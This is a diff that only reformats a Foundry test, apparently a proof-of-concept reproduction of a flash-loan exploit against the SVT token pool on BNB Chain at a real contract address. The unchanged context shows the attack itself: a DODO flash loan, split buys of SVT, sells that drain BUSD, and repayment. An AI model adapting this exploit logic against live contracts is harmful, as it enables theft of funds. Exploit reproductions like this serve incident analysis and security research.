@@ -14,7 +14,6 @@ interface ISVTpool {
     function sell(uint256 amount) external;
 }
 
-
 contract ContractTest is DSTest {
     IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 SVT = IERC20(0x657334B4FF7bDC4143941B1F94301f37659c6281);
@@ -24,7 +23,7 @@ contract ContractTest is DSTest {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 31178238 -1);
+        cheats.createSelectFork("bsc", 31_178_238 - 1);
     }
 
     function testExploit() public {
@@ -39,19 +38,16 @@ contract ContractTest is DSTest {
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
         // Buy SVT with BUSD
         uint256 amount = BUSD.balanceOf(address(this));
-        pool.buy(amount/2);
+        pool.buy(amount / 2);
         uint256 svtBalance1 = SVT.balanceOf(address(this));
-        pool.buy(amount - amount/2);
+        pool.buy(amount - amount / 2);
         uint256 svtBalance2 = SVT.balanceOf(address(this)) - svtBalance1;
         console2.log(svtBalance2);
         console2.log(svtBalance1);
         // Sell SVT for BUSD
         pool.sell(svtBalance2);
         pool.sell(SVT.balanceOf(address(this)) * 62 / 100);
-        
+
         BUSD.transfer(dodo, quoteAmount);
-                
     }
-
-
 }
